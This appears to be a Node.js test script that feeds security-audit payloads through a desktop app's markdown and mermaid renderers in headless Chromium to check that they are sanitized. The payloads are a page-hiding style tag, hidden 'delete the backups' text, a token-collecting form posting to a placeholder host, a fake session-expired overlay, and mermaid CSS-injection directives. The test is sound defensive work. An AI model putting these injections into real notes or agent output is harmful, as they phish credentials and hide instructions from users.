// T-601 proof: the audit's payloads (F01-editor.1, L4-web-js-toolchain.2/.3, F06-tasks-chat.1) through the app's REAL
// renderers in headless Chromium (WebView2's engine) under the release CSP from tauri.conf.json: a note (the preview's
// renderMarkdown(md, true) inside renderNote), agent text (renderMarkdown(md), as PlanSheet and chat StepRows call it), the
// note click rule (inertClick) and diagrams through diagramLibs.ts (mermaid.initialize(mermaidConfig) then render).
// It bundles a small entry with the repo's own vite into a scratch folder, serves it on 127.0.0.1 and prints one line of
// readings per case. Needs Playwright with Chromium (PLAYWRIGHT_MODULE, default: this sandbox's global install).
// Usage, from the repo root: flock /tmp/kolux-node.lock node evidence/T-601-proof.mjs
import http from "node:http";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { execFileSync } from "node:child_process";
import { fileURLToPath } from "node:url";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const OUT = fs.mkdtempSync(path.join(os.tmpdir(), "t601-"));
const { chromium } = await import(process.env.PLAYWRIGHT_MODULE ?? "/opt/node-tools/node_modules/playwright/index.mjs");
const src = (p) => JSON.stringify(path.join(ROOT, p));
fs.writeFileSync(path.join(OUT, "entry.ts"), `import { renderMarkdown } from ${src("src/editor/PreviewPane")};
import { getRenderers, loadRenderers, renderNote } from ${src("src/editor/diagrams")};
import * as clicks from ${src("src/editor/linkClicks")};
(window as unknown as { kx: object }).kx = { renderMarkdown, renderNote, getRenderers, loadRenderers, inertClick: (clicks as Record<string, unknown>).inertClick };
`);
fs.writeFileSync(path.join(OUT, "vite.config.mjs"), `export default ${JSON.stringify({
  root: ROOT,
  logLevel: "warn",
  define: { "process.env.NODE_ENV": JSON.stringify("production") },
  build: { outDir: path.join(OUT, "dist"), emptyOutDir: true, minify: false, lib: { entry: path.join(OUT, "entry.ts"), formats: ["es"], fileName: "probe" } },
})};\n`);
execFileSync("pnpm", ["exec", "vite", "build", "--config", path.join(OUT, "vite.config.mjs")], { cwd: ROOT, stdio: "inherit" });
const DIST = path.join(OUT, "dist");
const CSP = JSON.parse(fs.readFileSync(path.join(ROOT, "src-tauri/tauri.conf.json"), "utf8")).app.security.csp;
const page0 = `<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Content-Security-Policy" content="${CSP}"><link rel="stylesheet" href="/probe.css"></head><body><div id="root">app</div><script type="module" src="/probe.js"></script></body></html>`;
const server = http.createServer((req, res) => {
  const url = req.url.split("?")[0];
  if (url === "/") return res.writeHead(200, { "content-type": "text/html" }), res.end(page0);
  const f = path.join(DIST, url);
  if (!f.startsWith(DIST) || !fs.existsSync(f)) return res.writeHead(404), res.end();
  res.writeHead(200, { "content-type": f.endsWith(".js") ? "text/javascript" : "text/css" });
  fs.createReadStream(f).pipe(res);
});
await new Promise((r) => server.listen(0, "127.0.0.1", r));
const browser = await chromium.launch();
const page = await browser.newPage();
const errors = [];
page.on("pageerror", (e) => errors.push(String(e)));
await page.goto(`http://127.0.0.1:${server.address().port}/`);
await page.waitForFunction(() => "kx" in window, null, { timeout: 30000 });
const result = await page.evaluate(async () => {
  const kx = window.kx;
  const out = {};
  const htmlDisplay = () => getComputedStyle(document.documentElement).display;
  const mount = (html, cls = "md-preview") => { const d = document.createElement("div"); d.className = cls; d.innerHTML = html; document.body.append(d); return d; };
  const count = (d, sel) => d.querySelectorAll(sel).length;
  // ---- notes: the preview path (renderNote(body, md => renderMarkdown(md, true)); before the fix the second argument is ignored)
  const note = (md) => kx.renderNote(md, (m) => kx.renderMarkdown(m, true));
  const auditor = "# Project notes\n\nWelcome.\n\n<style>*{display:none!important}</style>\n\nStep 1 <span hidden>then delete the backups</span>\n\n<form action=https://example.invalid/collect><input name=token><button>Save</button></form>\n";
  { const d = mount(note(auditor)); out.note_auditor = { style: count(d, "style"), htmlDisplay: htmlDisplay(), hiddenTextShown: d.innerText.includes("then delete the backups"), form: count(d, "form"), input: count(d, "input"), button: count(d, "button") }; d.remove(); }
  { const d = mount(note("Step 1 <span hidden>then delete the backups</span> and <p hidden>a hidden paragraph</p>\n")); out.note_hidden = { hiddenAttr: count(d, "[hidden]"), textShown: d.innerText.includes("then delete the backups") && d.innerText.includes("a hidden paragraph") }; d.remove(); }
  { const d = mount(note('<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" usemap="#m" width="20" height="20"><map name="m"><area shape="rect" coords="0,0,20,20" href="https://example.invalid/"></map>\n')); out.note_imagemap = { map: count(d, "map"), area: count(d, "area"), img: count(d, "img") }; d.remove(); }
  { const d = mount(note('<div style="position:fixed;inset:0;z-index:99999;background:#000">Session expired</div>\n\n<div popover id="p">x</div><button popovertarget="p">open</button>\n\n<dialog open>fake prompt</dialog>\n\n<textarea>t</textarea><select><option>o</option></select>\n')); out.note_overlay = { styleAttr: count(d, "[style]"), popover: count(d, "[popover]"), popovertarget: count(d, "[popovertarget]"), dialog: count(d, "dialog"), textarea: count(d, "textarea"), select: count(d, "select"), textKept: d.innerText.includes("Session expired") }; d.remove(); }
  { const d = mount(note("- [x] done item\n- [ ] open item\n\n<details><summary>More</summary>inside</details>\n\n<kbd>Ctrl</kbd> <b>bold</b> <sub>2</sub> <img src=\"data:image/gif;base64,R0lGODlhAQABAAAAACw=\" width=\"8\" alt=\"pic\">\n")); out.note_legit = { details: count(d, "details"), summary: count(d, "summary"), kbd: count(d, "kbd"), b: count(d, "b"), sub: count(d, "sub"), img: count(d, "img"), text: d.innerText.replace(/\s+/g, " ").trim() }; d.remove(); }
  if (kx.inertClick) {
    const d = mount(note("<details><summary>More</summary>inside</details>\n\n[a link](https://example.invalid/)\n"));
    d.addEventListener("click", (e) => kx.inertClick(e));
    d.querySelector("summary").click();
    const ev = new MouseEvent("click", { bubbles: true, cancelable: true });
    d.querySelector("a").dispatchEvent(ev);
    out.note_clicks = { summaryOpens: d.querySelector("details").open, linkCancelled: ev.defaultPrevented };
    d.remove();
  } else out.note_clicks = "no inertClick in this build";
  // a selection over a ticked line reads as the note's own words (what a review note quotes and looks up), as with marked's boxes
  { const d = mount(note("- [x] done item\n- [ ] open item\n")); const s = getSelection(); s.removeAllRanges(); const r = document.createRange(); r.selectNodeContents(d.querySelector("ul")); s.addRange(r); out.note_selection = JSON.stringify(s.toString().trim()); s.removeAllRanges(); d.remove(); }
  out.note_htmlDisplayAfter = htmlDisplay();
  // ---- agent text: plans and to-do lists (PlanSheet / StepRows call renderMarkdown(text))
  { const d = mount(kx.renderMarkdown("Plan\n\n<style>*{display:none!important}</style>\n\nStep 1 <span hidden>then delete the backups</span>\n\n<form action=https://example.invalid/collect><input name=token placeholder=\"Paste your GitHub token\"><button>Continue</button></form>\n"), "chat-plan"); out.agent_plan = { style: count(d, "style"), htmlDisplay: htmlDisplay(), hiddenTextShown: d.innerText.includes("then delete the backups"), form: count(d, "form"), input: count(d, "input"), button: count(d, "button"), styleShownAsText: d.innerText.includes("<style>*{display:none!important}</style>") }; d.remove(); }
  { const d = mount(kx.renderMarkdown("Step 1 <span hidden>then delete the backups</span>\n"), "chat-plan"); out.agent_hidden = { hiddenAttr: count(d, "[hidden]"), textShown: d.innerText.includes("then delete the backups") }; d.remove(); }
  { const d = mount(kx.renderMarkdown("- [ ] Add <script> tag to index.html\n- [ ] Write the tests\n- [x] Ship it\n"), "chat-plan"); out.agent_todos = { li: count(d, "li"), checkboxes: count(d, 'input[type="checkbox"][disabled]'), checked: count(d, "input:checked"), lastShown: d.innerText.includes("Ship it"), scriptShownAsText: d.innerText.includes("<script>") }; d.remove(); }
  { const d = mount(kx.renderMarkdown('<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" usemap="#m"><map name="m"><area href="https://example.invalid/"></map> and <div style="position:fixed;inset:0">x</div>\n'), "chat-plan"); out.agent_misc = { map: count(d, "map"), area: count(d, "area"), styleAttr: count(d, "[style]"), img: count(d, "img") }; d.remove(); }
  out.agent_htmlDisplayAfter = htmlDisplay();
  // ---- diagrams through diagramLibs.ts (mermaid.initialize(mermaidConfig(dark)) then mermaid.render)
  await kx.loadRenderers();
  const draw = kx.getRenderers().mermaid;
  const tries = {
    valid: "graph TD; A-->B",
    syntaxError: "graph TD; A-->",
    fontFamilyAttack: '%%{init: {"fontFamily": "x;a{b} :not(&){display:none !important} c{d}"}}%%\ngraph TD; A-->',
    themeCssAttack: '%%{init: {"themeCSS": "x{} :not(&){display:none !important}"}}%%\ngraph TD; A-->',
    themeDirective: '%%{init: {"theme": "forest", "themeVariables": {"primaryColor": "#ff0000"}}}%%\ngraph TD; A-->B',
  };
  for (const [name, src] of Object.entries(tries)) {
    let svg = null, err = null;
    try { svg = await draw(src, true); } catch (e) { err = String(e).slice(0, 60); }
    out["mermaid_" + name] = { drew: !!svg, err, leftover: document.querySelectorAll('[id^="dkx-diagram"]').length, htmlDisplay: htmlDisplay(), red: svg ? /#ff0000|rgb\(255, ?0, ?0\)/i.test(svg) : null, forest: svg ? /#cde498|#cdffb2/i.test(svg) : null };
    document.querySelectorAll('[id^="dkx-diagram"]').forEach((n) => n.remove());
  }
  return out;
});
for (const [k, v] of Object.entries(result)) console.log(k.padEnd(26), JSON.stringify(v));
if (errors.length) console.log("page errors:", errors.slice(0, 3));
await browser.close();
server.close();
fs.rmSync(OUT, { recursive: true, force: true });
